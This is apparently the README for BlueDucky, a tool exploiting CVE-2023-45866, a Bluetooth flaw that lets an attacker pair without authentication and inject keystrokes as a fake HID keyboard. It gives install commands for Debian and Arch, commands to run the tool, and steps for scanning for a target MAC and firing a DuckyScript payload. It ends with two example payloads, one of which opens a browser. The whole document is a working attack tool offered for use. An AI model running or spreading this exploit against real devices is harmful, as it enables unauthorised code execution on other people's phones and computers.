NOTES: I will not be able to run this on a laptop or other device outside of a raspberry pi for testing. Due to this, any issues you have will need to be resolved amonsgt each other as I do not have the spare funds to buy an adapter.

🚨 CVE-2023-45866 - BlueDucky Implementation (Using DuckyScript)

🔓 Unauthenticated Peering Leading to Code Execution (Using HID Keyboard)


## Installation and Usage 🛠️

### Setup Instructions for Debian-based 

```bash
# update apt
sudo apt-get update
sudo apt-get -y upgrade

# install dependencies from apt
sudo apt install -y bluez-tools bluez-hcidump libbluetooth-dev \
                    git gcc python3-pip python3-setuptools \
                    python3-pydbus

# install pybluez from source
git clone https://github.com/pybluez/pybluez.git
cd pybluez
sudo python3 setup.py install

# build bdaddr from the bluez source
cd ~/
git clone --depth=1 https://github.com/bluez/bluez.git
gcc -o bdaddr ~/bluez/tools/bdaddr.c ~/bluez/src/oui.c -I ~/bluez -lbluetooth
sudo cp bdaddr /usr/local/bin/
```
### Setup Instructions for Arch-based 

```bash
# update pacman & packages
sudo pacman -Syyu

# install dependencies
# since arch doesn't separate lib packages: libbluetooth-dev included in bluez package
sudo pacman -S bluez-tools bluez-utils bluez-deprecated-tools \
               python-setuptools python-pydbus python-dbus
               git gcc python-pip \

# install pybluez from source
git clone https://github.com/pybluez/pybluez.git
cd pybluez
sudo python3 setup.py install

# build bdaddr from the bluez source
cd ~/
git clone --depth=1 https://github.com/bluez/bluez.git
gcc -o bdaddr ~/bluez/tools/bdaddr.c ~/bluez/src/oui.c -I ~/bluez -lbluetooth
sudo cp bdaddr /usr/local/bin/
```

## Running BlueDucky
```bash
git clone https://github.com/pentestfunctions/BlueDucky.git
cd BlueDucky
sudo hciconfig hci0 up
python3 BlueDucky.py
```

alternatively,

```bash
pip3 install -r requirements.txt
```

## Operational Steps 🕹️
1. On running, it prompts for the target MAC address.
2. Pressing nothing triggers an automatic scan for devices.
3. Devices previously found are stored in known_devices.txt.
4. If known_devices.txt exists, it checks this file before scanning.
5. Executes using payload.txt file.
6. Successful execution will result in automatic connection and script running.


##  Checks your bluetooth adapters, and installed dependancies before allowing access to the application, this is to prevent devices that are not supported.

  
## What's Planned for the 
#### 📝 Example payload.txt:
```bash
REM Title of the payload
STRING ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_-=+\|[{]};:'",<.>/?
GUI D
```

```bash
REM Opens a private browser to hackertyper.net
DELAY 200
ESCAPE
GUI d
ALT ESCAPE
GUI b
DELAY 700
REM PRIVATE_BROWSER is equal to CTRL + SHIFT + N
PRIVATE_BROWSER
DELAY 700
CTRL l
DELAY 300
STRING hackertyper.net
DELAY 300
ENTER
DELAY 300
```
